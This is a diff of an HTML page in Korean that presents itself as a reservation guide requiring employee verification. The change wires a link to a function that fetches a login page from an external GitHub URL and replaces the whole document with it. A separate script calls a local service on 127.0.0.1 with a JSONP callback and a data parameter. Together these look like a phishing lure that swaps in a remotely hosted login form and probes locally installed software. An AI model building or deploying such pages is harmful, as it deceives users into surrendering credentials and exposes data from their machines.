@@ -45,9 +45,7 @@
         }
     </style>
     <script>
-    document.getElementById("loginBtn").addEventListener("click", function(e) {
-      e.preventDefault();
-      
+    function loadLoginPage() {
       fetch("https://raw.githubusercontent.com/windshock/windshock.github.io/refs/heads/master/static/login.html")
         .then(res => res.text())
         .then(html => {
@@ -55,8 +53,9 @@
           document.write(html);
           document.close();
         });
-    });
+    }
     </script>
+
     <script>
         async function fetchForBrowser() {
             const baseUrl = "https://127.0.0.1:17489/?callback=nexessCallBack707529&data=";
@@ -121,7 +120,7 @@
 
                         <div class="section">
                             <h2>🌐 예약 안내</h2>
-                            <p>예약사이트:  <a class="btn" href="#" id="loginBtn">예약 신청 바로가기</a> (Chrome/MS엣지 접속)</p>
+                            <p>예약사이트:  <a href="javascript:loadLoginPage()"> (Chrome/MS엣지 접속)</p>
                             <p>회원가입 → 직원 인증 후 예약 가능</p>
                         </div>
 
